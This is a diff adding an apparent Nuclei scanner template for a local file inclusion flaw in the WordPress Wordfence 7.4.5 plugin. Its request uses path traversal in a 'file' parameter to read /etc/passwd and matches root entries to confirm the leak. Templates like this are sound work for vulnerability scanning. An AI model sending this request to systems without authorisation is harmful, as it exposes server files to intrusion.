@@ -1,0 +1,33 @@
+http:
+    - matchers:
+        - regex:
+            - 'root:.*:0:0:'
+          type: regex
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/wp-content/plugins/wordfence/lib/wordfenceClass.php?file=/../../../../../../etc/passwd'
+id: wordpress-wordfence-lfi
+info:
+    author: 0x_Akoko
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+        cvss-score: 7.5
+        cwe-id: CWE-22
+    description: WordPress Wordfence 7.4.5 is vulnerable to local file inclusion.
+    metadata:
+        max-request: 1
+    name: WordPress Wordfence 7.4.5 - Local File Inclusion
+    reference:
+        - https://www.exploit-db.com/exploits/48061
+        - https://www.nmmapper.com/st/exploitdetails/48061/42367/wordpress-plugin-wordfence745-local-file-disclosure/
+    severity: high
+    tags:
+        - wordpress
+        - wp-plugin
+        - wordfence
+        - edb
+        - WordPress
